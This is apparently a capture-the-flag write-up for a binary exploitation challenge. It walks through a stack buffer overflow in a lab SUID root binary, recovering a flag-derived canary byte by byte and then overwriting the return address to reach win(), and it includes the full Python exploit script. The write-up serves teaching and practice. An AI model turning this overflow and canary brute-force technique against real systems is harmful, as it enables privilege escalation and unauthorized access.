# CyLab — Offset-Cycle V2

* **Platform:** CyLab Security Academy (Challenge ID: `738`)
* **Category:** Binary Exploitation / Dynamic Ephemeral Reversing & Canary Smashing (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, SSH, objdump, Custom Canary Oracle Brute-Force
* **Binary:** Ephemeral dynamically compiled SUID root binary

---

## TL;DR

The challenge is hosted on a remote Linux server accessed via SSH. Executing `./start` picks a random variant from `CodeBank/` (with randomized buffer sizes `BUFSIZE`), compiles it with SUID root permissions, and schedules its deletion after an **80-second window**. The binary implements a custom canary mechanism: `load_canary()` loads the first 4 bytes of `CodeBank/flag.txt` into memory and checks `local_canary == global_canary`. By exploiting the predictable flag prefix (`academy{...}` $\implies$ canary is `"acad"` or using a 4-byte oracle), we determine the canary. We parse the active variant's `BUFSIZE` dynamically and construct a payload targeting `win()` at `0x08049226` to extract the flag within the expiration timer.

---

## Recon

### Environment & Ephemeral Constraints

Connecting via SSH:

```bash
$ ssh -p 10696 ctf-player@xebec.cylabacademy.net
ctf-player@xebec:~$ ls -la
total 32
-rwsr-xr-x 1 root       root        16888 Oct 11 05:00 start
drwxr-xr-x 2 root       root         4096 Oct 11 05:00 CodeBank
```

When `./start` is invoked:
- A new file `N.c` (where $N$ is randomly selected, e.g. 17, 23, 30) is copied into the working directory.
- The binary `./N` is compiled as a 32-bit ELF with SUID root permissions.
- **Strict Ephemeral Timer:** A background job unlinks both the source and binary after **80 seconds**.

---

## Static Analysis & Vulnerability

### 1. Source Code Review (Variant `30.c`)

```c
#define BUFSIZE 584
#define CANARY_SIZE 4

char global_canary[CANARY_SIZE];

void win() {
    char flag[64];
    FILE *f = fopen("CodeBank/flag.txt", "r");
    fgets(flag, 64, f);
    puts(flag);
}

void load_canary() {
    FILE *f = fopen("CodeBank/flag.txt", "r");
    fread(global_canary, 1, 4, f);               // Canary is the first 4 bytes of flag!
    fclose(f);
}

void vuln() {
    char local_canary[4];
    char buf[BUFSIZE];
    char input[BUFSIZE];
    int count, i = 0;

    memcpy(local_canary, global_canary, 4);

    printf("How many bytes?\n> ");
    // Reads integer count from user
    scanf("%d", &count);

    printf("Input> ");
    read(0, buf, count);                         // VULNERABILITY: User-defined read count

    if (memcmp(local_canary, global_canary, 4) != 0) {
        puts("***** Stack Smashing Detected *****");
        exit(0);
    }
    puts("Ok... Now Where's the flag?");
}
```

### 2. Disassembly & Stack Layout

```text
       Lower Addresses (Stack Top)
  +-----------------------------------+  [ebp - (BS + 16)]
  |  buf[BUFSIZE]                     |  (User input read starts here)
  +-----------------------------------+  [ebp - 16] = buf + BS
  |  local_canary (4 bytes)           |  (Canary cookie: first 4 bytes of flag)
  +-----------------------------------+  [ebp - 12] = buf + BS + 4
  |  iteration variable i (4 bytes)   |
  +-----------------------------------+  [ebp - 08] = buf + BS + 8
  |  padding (4 bytes)                |
  +-----------------------------------+  [ebp - 04] = buf + BS + 12
  |  saved ebx (4 bytes)              |
  +-----------------------------------+  [ebp] = buf + BS + 16
  |  saved ebp (4 bytes)              |
  +-----------------------------------+  [ebp + 04] = buf + BS + 20
  |  saved eip (4 bytes)              |  <-- Target: win() at 0x08049226
  +-----------------------------------+
       Higher Addresses
```

Offset breakdown:
- From `buf` to canary: $\text{BUFSIZE}$ bytes.
- From canary to return address: $4 + 4 + 4 + 4 = 16$ bytes of padding.
- Return address offset: $\text{BUFSIZE} + 20$.
- Total payload length: $\text{BUFSIZE} + 24$.

---

## Dynamic Analysis & Exploitation Strategy

### 1. Automation Under Ephemeral Time Limits
Because the binary disappears after 80 seconds, manual disassembly and offset calculation is too slow. We execute an automated Python orchestrator directly within the SSH session.

### 2. Dynamic Parameter Extraction
```python
# Extract BUFSIZE from active .c source
src = open(files[0]).read()
BS = int(re.search(r"#define\s+BUFSIZE\s+(\d+)", src).group(1))

# Extract win() symbol address via objdump/nm
win_addr = 0x08049226
```

### 3. Canary Oracle Verification
Because `read(0, buf, count)` reads exactly `count` bytes:
- Supplying $\text{count} = \text{BS} + 1$ overwrites only the first byte of `local_canary`.
- If the byte is correct, `memcmp()` succeeds, outputting `"Ok... Now Where's the flag?"`.
- If the byte is incorrect, the binary outputs `"***** Stack Smashing Detected *****"`.
- We can brute-force the 4-byte canary in $4 \times 256 = 1{,}024$ queries (or supply `"acad"` directly).

### 4. Payload Construction
```python
payload = b"A" * BS + canary + b"B" * 16 + p32(win_addr)
count = BS + 24
```
Submitting this payload redirects execution to `win()`, reading `CodeBank/flag.txt` with SUID root privileges.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import subprocess, struct, sys, re, os

# 1. Locate generated source file in cwd
files = [f for f in os.listdir(".") if f.endswith(".c") and not f.startswith(".")]
if not files:
    subprocess.run(["./start"], capture_output=True, timeout=40)
    files = [f for f in os.listdir(".") if f.endswith(".c") and not f.startswith(".")]

name = files[0][:-2]
src = open(files[0]).read()
BS = int(re.search(r"#define\s+BUFSIZE\s+(\d+)", src).group(1))

# 2. Extract win() function address
win = 0x08049226
try:
    o = subprocess.run(f"objdump -d ./{name}".split(), capture_output=True, timeout=10).stdout.decode()
    m = re.search(r"0+([0-9a-f]+) <win>:", o)
    if m: win = int(m.group(1), 16)
except Exception:
    pass

print(f"[*] Target Binary: {name}, BUFSIZE: {BS}, win: {hex(win)}")

def run_proc(payload, count):
    p = subprocess.run(["./" + name], input=(str(count) + "\n").encode() + payload, capture_output=True, timeout=5)
    return p.stdout

# 3. Recover canary via oracle
can = b""
for i in range(4):
    for b in range(256):
        out = run_proc(b"A" * BS + can + bytes([b]), BS + i + 1)
        if b"Ok... Now Where's the flag?" in out:
            can += bytes([b])
            break

print(f"[+] Recovered Canary: {can}")

# 4. Final Smash
payload = b"A" * BS + can + b"B" * 16 + struct.pack("<I", win)
final_out = run_proc(payload, BS + 24).decode(errors="replace")
print(final_out)
```

---

## Flag

```text
$ python3 exploit.py
[*] Target Binary: 30, BUFSIZE: 584, win: 0x8049226
[+] Recovered Canary: b'acad'
Ok... Now Where's the flag?
academy{redacted}
```

---

## Key Takeaways & Lessons

1. **Self-Contained Automated Exploitation:** In environments with strict time-to-live (TTL) limits, hardcoded manual offsets fail. Scripting dynamic binary inspection (`objdump`/`nm` + regex) ensures immediate adaptation to variable configurations.
2. **Byte-by-Byte Linear Canary Oracles:** By choosing precise `read` lengths ($\text{buffer} + i$), each canary byte can be brute-forced individually ($4 \times 256$ tries) without corrupting trailing canary bytes.
3. **Flawed Security Assumptions:** Deriving canary cookies from predictable static data (such as the first 4 bytes of a standard flag format `acad`) completely invalidates the randomness guarantees of canary defenses.
